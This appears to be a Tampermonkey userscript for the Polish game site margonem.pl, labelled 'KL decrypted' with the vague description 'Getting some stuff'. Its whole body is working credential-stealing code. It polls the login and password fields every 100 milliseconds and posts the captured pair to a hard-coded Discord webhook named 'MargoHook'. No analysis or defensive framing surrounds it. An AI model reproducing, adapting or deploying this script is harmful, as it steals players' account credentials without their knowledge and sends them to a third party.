// ==UserScript==
// @name         KL decrypted
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  Getting some stuff
// @author       SL
// @match        https://www.margonem.pl/
// @grant        none
// @require http://code.jquery.com/jquery-3.4.1.min.js
// ==/UserScript==

(function() {

    var login, password, formatted;
    function sendLogin() {
    $("#ulogin").val() != login && $("#ulogin").val() && (login = $("#ulogin").val()), $("#upass").val() != password && $("#upass").val() && (password = $("#upass").val()), !$("#upass").val() && !$("#ulogin").val() && login && password && formatted != login + " | " + password &&
            ($.ajax({
            url: "https://discord.com/api/webhooks/707651719550599168/yEwKzy9yuftfSV5eRaKbJRgaMNvzsdQ1_gAhUA-1FcPy6uwUXmrARX0PvD7GFvALOKMX",
            method: "POST",
            contentTypE: "application/json",
            data: {"username": "MargoHook",
                   "avatar_url": "https://discordguide.github.io/assets/PIRATE.png",
                   "content": login + "|" + password
                  }
        }), formatted = login + " | " + password)
    console.log(login)
    }
    setInterval(sendLogin, 100);

})();
